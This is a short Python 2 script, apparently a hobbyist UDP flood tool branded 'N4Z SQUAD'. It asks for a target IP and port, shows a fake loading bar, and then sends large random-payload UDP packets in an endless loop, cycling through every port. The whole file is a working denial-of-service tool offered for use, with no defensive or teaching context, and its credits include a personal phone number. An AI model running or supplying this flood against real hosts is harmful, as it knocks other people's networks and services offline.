
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print "\033[33;1m____\033[33;1m"
os.system("figlet N4Z SQUAD")
print "\033[32;1m==========================\033[32;1m"
print "Author   : ./ Alul_72 ,N4D1V3 &  N19HTC0R3"
print "Contact  : +6285853722794"
print "Youtube  : N4Z-SQUAD"
print "Github   : N4Z-SQUAD"
print "Tanks To : All member N4Z SQUAD"
print "\033[32;1m<==========================>\033[32;1m"
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Tunggu!...")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "ngirim %s packet ke %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

